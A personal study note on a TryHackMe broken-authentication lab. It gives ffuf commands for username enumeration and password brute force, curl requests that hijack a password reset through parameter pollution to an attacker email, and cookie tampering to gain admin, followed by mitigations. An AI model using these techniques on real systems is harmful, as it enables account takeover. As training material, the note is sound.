https://tryhackme.com/room/brokenauthentication

### Table of contents
- [[#Username Enumeration]]
- [[#Credential Brute Force]]
- [[#Logic Flaws]]
- [[#Cookie Tampering]]
- [[#Mitigation]]

___
### Username Enumeration
[[#Table of contents|Back to the top]]

```Shell
ffuf -w /PATH/TO/USERNAMES_WORDLIST.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://TARGET_IP/PATH/TO/LOGIN_PAGE -mr "username already exists"
```
`-mr`: restricts responses to only positive results
Save results to .txt file

___
### Credential Brute Force
[[#Table of contents|Back to the top]]

```Shell
ffuf -w valid_usernames.txt:W1,/PATH/TO/MOST_USED_PASSWORDS.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://TARGET_IP/PATH/TO/LOGIN_PAGE -fc 200
```

___
### Logic Flaws
[[#Table of contents|Back to the top]]

##### Case-Sensitive Path Comparison
2 components disagree about input interpretation (e.g.: `/admin` vs `/Admin`)

##### Parameter Pollution in Password Reset

Reset page
1. Accepts **email address**, if it matches known account go to step 2
2. Accepts **username** associated with email, if successful send password reset link to email on file

*Example*

Submit `robert@acmeitsupport.thm` and username `robert`
App sends reset link to `robert@acmeitsupport.thm`

Legitimate curl command
```Shell
curl 'http://10.129.156.38/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

Server-side, app identifies target account from query string parameter `email`, composes outbound reset message using PHP `$_REQUEST` superglobal
--> second `email` parameter placed into request body silently overrides value --> reset link sent to attacker

```Shell
curl 'http://10.129.156.38/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

Identity check reads from one source, outbound email reads from another


```Shell
curl 'http://10.129.156.38/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=steve@customer.acmeitsupport.thm'
```

___
### Cookie Tampering
[[#Table of contents|Back to the top]]

##### Plain Text

Stores underlying state directly in header, visible and editable

*Example*
```Headers
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

```Shell
curl -H "Cookie: logged_in=true; admin=true" http://TARGET_IP/TARGET_PAGE
```

##### Hashed
https://crackstation.net/
https://hashes.com/en/decrypt/hash

##### Encoded

*Example*
```Header
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```

base64 decode `eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==` --> `{"id":1,"admin":false}`
--> modify admin's value into true and reencode

___
### Mitigation
[[#Table of contents|Back to the top]]
##### Username Enumeration
- Return indistinguishable responses for registered/unregistered values, on every authentication-related endpoint (signup, login, password reset)
- Rate limiting, CAPTCHA
##### Credential Brute Force
- Rate limiting, account lockout after threshold number of failed attempts
- MFA
- Strong password policies
##### Logic Flaws
- Every security-relevant decision should read its input from a single trusted source
- Avoid frameworks/languages that silently merge inputs from multiple sources
- PHP: favor explicit access to `$_GET`, `$_POST`, `$_COOKIE` over `$_REQUEST`
##### Cookie Tampering
- Sign session tokens with strong server-side secret --> HMAC / [[03 JWT|JWT]]
- Opaque session identifier, hold actual session state server-side (Redis / database) --> cookie holds no meaningful payload